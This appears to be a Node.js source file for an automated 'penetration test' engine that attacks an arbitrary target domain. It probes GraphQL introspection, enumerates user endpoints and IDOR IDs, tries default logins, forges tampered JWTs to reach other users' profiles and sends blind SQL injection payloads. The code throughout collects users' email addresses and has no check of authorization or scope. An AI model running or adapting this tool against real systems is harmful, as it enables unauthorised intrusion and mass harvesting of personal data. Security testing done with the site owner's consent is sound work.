const axios = require('axios');
const jwt = require('jsonwebtoken');

class PentestEngine {
  constructor(domain) {
    this.domain = domain;
    this.findings = {
      vulnerabilities: [],
      emailsExtracted: new Set(),
      attackVectors: [],
      severity: 'UNKNOWN',
      confidence: 0
    };
    this.axiosInstance = axios.create({
      timeout: 5000,
      validateStatus: () => true,
      maxRedirects: 5
    });
  }

  // ===== ATTACK 1: GraphQL Introspection =====
  async attackGraphQLIntrospection() {
    console.log('🔍 [ATTACK 1] GraphQL Introspection Scanning.. .');
    
    const gqlEndpoints = [
      '/graphql',
      '/api/graphql',
      '/v1/graphql',
      '/graph',
      '/api/v1/graphql'
    ];

    const introspectionQueries = [
      // Standard introspection
      `query { __schema { types { name fields { name type { name } } } } }`,
      
      // Query root types
      `query { __schema { queryType { fields { name } } } }`,
      
      // Find User type
      `query { __type(name: "User") { name fields { name type { name } } } }`,
      `query { __type(name: "Query") { fields { name type { name } } } }`,
      
      // Mutation enumeration
      `query { __schema { mutationType { fields { name } } } }`
    ];

    for (const endpoint of gqlEndpoints) {
      for (const query of introspectionQueries) {
        try {
          const response = await this.axiosInstance.post(`https://${this.domain}${endpoint}`, {
            query
          }, {
            headers: { 'Content-Type': 'application/json' }
          });

          if (response.status === 200 && response.data.data) {
            console.log(`✅ GraphQL endpoint found: ${endpoint}`);
            
            this.findings.vulnerabilities.push({
              type: 'GraphQL Introspection Enabled',
              severity: 'HIGH',
              endpoint,
              details: 'Schema publicly exposed - full API structure visible'
            });

            // Now extract actual user data
            await this.queryGraphQLUsers(endpoint);
            return true;
          }
        } catch (e) {
          // Endpoint doesn't exist, continue
        }
      }
    }
    return false;
  }

  async queryGraphQLUsers(endpoint) {
    const userQueries = [
      // Standard user query
      `query { users { id email name } }`,
      
      // Paginated
      `query { users(first: 1000) { edges { node { id email } } } }`,
      
      // Direct allUsers
      `query { allUsers { id email name username } }`,
      
      // With filtering disabled
      `query { users(limit: 999999) { email } }`,
      
      // Mutation attempt
      `query { user(id: "0") { email } }`,
      
      // Search all
      `query { search(query: "*") { ... on User { email } } }`
    ];

    for (const query of userQueries) {
      try {
        const response = await this.axiosInstance. post(`https://${this.domain}${endpoint}`, {
          query
        });

        if (response.data.data) {
          this.extractEmailsFromGraphQL(response.data.data);
        }
      } catch (e) {
        // Query failed, try next
      }
    }
  }

  extractEmailsFromGraphQL(data) {
    // Recursive email extraction from nested GraphQL response
    const extract = (obj) => {
      if (! obj) return;
      
      if (Array.isArray(obj)) {
        obj.forEach(item => extract(item));
      } else if (typeof obj === 'object') {
        if (obj.email && typeof obj.email === 'string' && obj.email.includes('@')) {
          this.findings.emailsExtracted.add(obj. email);
        }
        Object.values(obj).forEach(value => extract(value));
      }
    };

    extract(data);
  }

  // ===== ATTACK 2: REST API Enumeration =====
  async attackRESTEnumeration() {
    console.log('🔍 [ATTACK 2] REST API Enumeration.. .');

    const endpoints = [
      // User endpoints
      '/api/users',
      '/api/v1/users',
      '/api/v2/users',
      '/users',
      '/profiles',
      '/api/profiles',
      '/api/members',
      '/api/accounts',
      '/api/people',
      '/api/staff',
      
      // Search endpoints
      '/api/search',
      '/api/search/users',
      '/search',
      
      // Directory endpoints
      '/api/directory',
      '/directory',
      '/api/contacts',
      
      // Team/Organization
      '/api/teams',
      '/api/organizations',
      '/api/org/members',
      
      // Admin endpoints (sometimes unprotected)
      '/admin/users',
      '/api/admin/users',
      '/admin/api/users'
    ];

    for (const endpoint of endpoints) {
      try {
        // GET request
        const getResponse = await this.axiosInstance.get(`https://${this.domain}${endpoint}`);
        
        if (getResponse.status === 200 && this.isUserData(getResponse.data)) {
          console.log(`✅ Found user data at: ${endpoint}`);
          
          this.findings.vulnerabilities. push({
            type: 'Unauthenticated Data Exposure',
            severity: 'CRITICAL',
            endpoint,
            dataPoints: this.countEmails(getResponse.data)
          });

          this.extractEmails(getResponse.data);
        }

        // Try pagination
        const paginatedEndpoints = [
          `${endpoint}?page=1&limit=1000`,
          `${endpoint}?offset=0&limit=10000`,
          `${endpoint}?skip=0&take=5000`,
          `${endpoint}?per_page=999`
        ];

        for (const paginatedUrl of paginatedEndpoints) {
          try {
            const pagResponse = await this.axiosInstance. get(`https://${this.domain}${paginatedUrl}`);
            if (pagResponse.status === 200) {
              this.extractEmails(pagResponse.data);
            }
          } catch (e) {
            // Skip
          }
        }

      } catch (e) {
        // Endpoint doesn't exist
      }
    }
  }

  isUserData(data) {
    const stringified = JSON.stringify(data).toLowerCase();
    return stringified. includes('email') || stringified.includes('user');
  }

  countEmails(data) {
    let count = 0;
    const stringify = JSON.stringify(data);
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const matches = stringify.match(emailRegex);
    return matches ? matches.length : 0;
  }

  extractEmails(data) {
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const stringify = JSON.stringify(data);
    const matches = stringify.match(emailRegex);
    
    if (matches) {
      matches.forEach(email => this.findings.emailsExtracted. add(email));
    }
  }

  // ===== ATTACK 3: JWT Token Manipulation =====
  async attackJWTWeakness() {
    console.log('🔍 [ATTACK 3] JWT Token Weakness Testing...');

    const loginEndpoints = [
      '/api/auth/login',
      '/api/v1/auth/login',
      '/api/login',
      '/login',
      '/api/authenticate',
      '/auth/login'
    ];

    const testCredentials = [
      { email: 'test@test.com', password: 'test123' },
      { username: 'test', password: 'test' },
      { email: 'admin@test.com', password: 'admin123' },
      { username: 'admin', password: 'admin' }
    ];

    for (const endpoint of loginEndpoints) {
      for (const creds of testCredentials) {
        try {
          const loginResponse = await this.axiosInstance.post(
            `https://${this.domain}${endpoint}`,
            creds
          );

          if (loginResponse.data.token || loginResponse.data.access_token) {
            const token = loginResponse.data.token || loginResponse.data.access_token;
            console.log(`✅ Got token from: ${endpoint}`);

            await this.analyzeJWT(token, endpoint);
          }
        } catch (e) {
          // Credentials failed or endpoint doesn't exist
        }
      }
    }
  }

  async analyzeJWT(token, endpoint) {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return;

      // Decode without verification
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());

      // Check for weak claims
      const weakClaimPatterns = ['user_id', 'userId', 'id', 'uid', 'sub'];
      let foundWeakClaim = null;

      for (const claim of weakClaimPatterns) {
        if (payload[claim]) {
          foundWeakClaim = claim;
          break;
        }
      }

      if (foundWeakClaim) {
        this.findings.vulnerabilities.push({
          type: 'JWT Manipulation Possible',
          severity: 'CRITICAL',
          endpoint,
          weakClaim: foundWeakClaim,
          details: `Token uses simple ${foundWeakClaim} claim - can be modified for privilege escalation`
        });

        // Try to enumerate users via token manipulation
        await this.enumerateViaJWT(token, foundWeakClaim, endpoint);
      }

      // Check if token is unsigned (alg: 'none')
      const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
      if (header.alg === 'none') {
        this.findings.vulnerabilities.push({
          type: 'JWT Algorithm:  none',
          severity: 'CRITICAL',
          endpoint,
          details: 'Token signed with alg=none - can be forged'
        });
      }

    } catch (e) {
      // Can't decode
    }
  }

  async enumerateViaJWT(token, claimName, endpoint) {
    const parts = token.split('.');
    const payload = JSON.parse(Buffer. from(parts[1], 'base64').toString());
    const originalValue = payload[claimName];

    // Try to access other users
    for (let i = 1; i <= 100; i++) {
      const modifiedPayload = { ...payload, [claimName]: i };
      const newPayload = Buffer.from(JSON.stringify(modifiedPayload)).toString('base64');
      
      // Create a potentially valid token (signature won't verify but app might accept it)
      const fakeToken = parts[0] + '.' + newPayload + '.' + parts[2];

      try {
        // Try to access /me or /profile endpoint
        const profileResponse = await this.axiosInstance.get(
          `https://${this.domain}/api/me`,
          { headers: { Authorization:  `Bearer ${fakeToken}` } }
        );

        if (profileResponse.status === 200 && profileResponse.data.email) {
          this.findings. emailsExtracted.add(profileResponse.data.email);
        }
      } catch (e) {
        // Token rejected
      }
    }
  }

  // ===== ATTACK 4: IDOR (Insecure Direct Object Reference) =====
  async attackIDOR() {
    console.log('🔍 [ATTACK 4] IDOR Vulnerability Scanning...');

    const idorTemplates = [
      '/api/users/{id}',
      '/api/v1/users/{id}',
      '/api/profiles/{id}',
      '/api/accounts/{id}',
      '/api/members/{id}',
      '/api/people/{id}',
      '/user/{id}',
      '/profile/{id}',
      '/api/me/{id}',
      '/api/data/{id}',
      '/api/records/{id}'
    ];

    for (const template of idorTemplates) {
      // Try sequential IDs
      for (let id = 1; id <= 200; id++) {
        const endpoint = template.replace('{id}', id);
        
        try {
          const response = await this.axiosInstance.get(`https://${this.domain}${endpoint}`);

          if (response.status === 200 && response.data.email) {
            this.findings. emailsExtracted.add(response.data.email);

            // Only report vulnerability once
            if (!this.findings. vulnerabilities.find(v => v.type === 'IDOR')) {
              this.findings.vulnerabilities.push({
                type: 'IDOR (Insecure Direct Object Reference)',
                severity: 'CRITICAL',
                template,
                details: 'Sequential user IDs are enumerable without authentication'
              });
            }
          }
        } catch (e) {
          // Not found
        }
      }

      // Try UUIDs (common pattern)
      const uuids = [
        '00000000-0000-0000-0000-000000000001',
        '00000000-0000-0000-0000-000000000002',
        '00000000-0000-0000-0000-000000000003'
      ];

      for (const uuid of uuids) {
        const endpoint = template.replace('{id}', uuid);
        try {
          const response = await this.axiosInstance.get(`https://${this.domain}${endpoint}`);
          if (response.status === 200 && response.data.email) {
            this.findings.emailsExtracted.add(response.data.email);
          }
        } catch (e) {
          // Skip
        }
      }
    }
  }

  // ===== ATTACK 5: Security Header Analysis =====
  async attackMissingSecurityHeaders() {
    console.log('🔍 [ATTACK 5] Security Header Analysis...');

    try {
      const response = await this.axiosInstance. get(`https://${this.domain}`);
      const headers = response.headers;

      const requiredHeaders = [
        'content-security-policy',
        'x-frame-options',
        'x-content-type-options',
        'strict-transport-security',
        'x-xss-protection'
      ];

      for (const header of requiredHeaders) {
        if (! headers[header]) {
          this.findings.vulnerabilities.push({
            type: `Missing ${header. toUpperCase()}`,
            severity: 'MEDIUM',
            details: `Header ${header} not set - vulnerable to related attacks`
          });
        }
      }

      // Check CORS misconfiguration
      if (headers['access-control-allow-origin'] === '*') {
        this.findings. vulnerabilities.push({
          type: 'CORS Misconfiguration',
          severity: 'HIGH',
          details: 'Access-Control-Allow-Origin:  * allows any domain to access API'
        });
      }

    } catch (e) {
      // Can't reach domain
    }
  }

  // ===== ATTACK 6: Timing-Based Blind SQLi =====
  async attackTimingBasedSQLi() {
    console.log('🔍 [ATTACK 6] Timing-Based Blind SQLi Testing...');

    const endpoints = ['/api/users', '/api/search', '/search', '/api/data'];
    const timingPayloads = [
      { id: "1' AND SLEEP(5) AND '1'='1" },
      { id: "1'; WAITFOR DELAY '00:00:05'; --" },
      { email: "test' AND SLEEP(5) AND '1'='1" }
    ];

    for (const endpoint of endpoints) {
      for (const payload of timingPayloads) {
        try {
          const startTime = Date.now();
          
          await this.axiosInstance.post(`https://${this.domain}${endpoint}`, payload);
          
          const elapsed = Date.now() - startTime;

          // If response took significantly longer, SQLi might work
          if (elapsed > 5000) {
            this.findings.vulnerabilities.push({
              type: 'Potential Timing-Based Blind SQLi',
              severity: 'CRITICAL',
              endpoint,
              responseTime: elapsed + 'ms',
              details:  'Response delayed - database query execution detected'
            });
          }
        } catch (e) {
          // Error or timeout
        }
      }
    }
  }

  // ===== MAIN EXECUTION =====
  async runFullAttack() {
    console.log(`\n${'='.repeat(60)}`);
    console.log(`🔴 AGGRESSIVE PENETRATION TEST:  ${this.domain}`);
    console.log(`${'='.repeat(60)}\n`);

    // Execute all attacks
    await this.attackGraphQLIntrospection();
    await this.attackRESTEnumeration();
    await this.attackJWTWeakness();
    await this.attackIDOR();
    await this.attackMissingSecurityHeaders();
    await this.attackTimingBasedSQLi();

    // Calculate severity
    this.calculateSeverity();

    return this.generateReport();
  }

  calculateSeverity() {
    const criticalCount = this.findings.vulnerabilities. filter(v => v.severity === 'CRITICAL').length;
    const highCount = this.findings.vulnerabilities.filter(v => v.severity === 'HIGH').length;

    if (criticalCount > 0 && this.findings.emailsExtracted.size > 0) {
      this.findings. severity = 'CRITICAL';
      this.findings.confidence = 95;
    } else if (criticalCount > 0) {
      this.findings.severity = 'CRITICAL';
      this.findings. confidence = 80;
    } else if (highCount > 0) {
      this.findings.severity = 'HIGH';
      this.findings. confidence = 70;
    } else if (this.findings.vulnerabilities.length > 0) {
      this.findings.severity = 'MEDIUM';
      this.findings.confidence = 50;
    } else {
      this.findings.severity = 'LOW';
      this.findings. confidence = 30;
    }
  }

  generateReport() {
    return {
      timestamp: new Date().toISOString(),
      target: this.domain,
      severity: this.findings.severity,
      confidence: this.findings.confidence,
      totalVulnerabilities: this.findings.vulnerabilities.length,
      emailsExtracted: Array.from(this.findings.emailsExtracted),
      emailCount: this.findings.emailsExtracted.size,
      vulnerabilities: this.findings.vulnerabilities
    };
  }
}

module.exports = { PentestEngine };
